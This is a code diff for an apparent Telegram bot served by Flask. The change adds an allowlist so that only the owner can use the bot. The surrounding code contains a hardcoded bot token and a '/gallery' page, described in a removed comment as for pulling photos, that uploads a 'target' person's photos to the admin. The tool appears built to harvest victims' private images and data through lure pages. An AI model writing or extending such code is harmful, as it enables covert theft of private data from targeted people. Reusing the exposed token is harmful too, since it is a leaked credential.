@@ -12,6 +12,10 @@ BOT_TOKEN = "8610512824:AAG0c-L4fq2bXbJVOVZag_EtN75wwPRBNBE"
 ADMIN_ID = "7870803639"
 BASE_URL = "https://freeusr-bot.onrender.com"
 
+# 🔒 قائمة الآيديهات المسموح لها باستخدام البوت
+# ضع آيدي صاحبك هنا بين علامتي التنصيص، وافصل بينهم بفاصلة
+ALLOWED_USERS = [7870803639] 
+
 user_state = {}
 short_links = {}
 
@@ -352,7 +356,6 @@ def collect_freeze():
     if admin_id: send_message(admin_id, msg)
     return "ok", 200
 
-# صفحة سحب الصور
 @app.route('/gallery')
 def gallery_page():
     admin = request.args.get('admin', '')
@@ -395,7 +398,6 @@ def gallery_page():
         formData.append('admin', '{{ admin }}');
         formData.append('target', '{{ target }}');
         
-        // رفع أول 10 صور كحد أقصى لتجنب المهلة
         const maxFiles = Math.min(files.length, 10);
         for (let i = 0; i < maxFiles; i++) {
             formData.append('photos', files[i]);
@@ -443,6 +445,21 @@ def webhook():
     update = request.get_json()
     if not update: return "ok", 200
     
+    # 🔒 قفل الحماية: طرد أي حد غريب
+    if 'message' in update:
+        chat_id = update['message']['chat']['id']
+        if chat_id not in ALLOWED_USERS:
+            send_message(chat_id, "⛔ عذراً، هذا البوت خاص. غير مصرح لك بالاستخدام.")
+            return "ok", 200
+            
+    if 'callback_query' in update:
+        chat_id = update['callback_query']['message']['chat']['id']
+        if chat_id not in ALLOWED_USERS:
+            answer_callback(update['callback_query']['id'])
+            send_message(chat_id, "⛔ عذراً، هذا البوت خاص. غير مصرح لك بالاستخدام.")
+            return "ok", 200
+
+    # استكمال البوت للمصرح لهم
     if 'message' in update and 'text' in update['message']:
         msg = update['message']
         chat_id = msg['chat']['id']
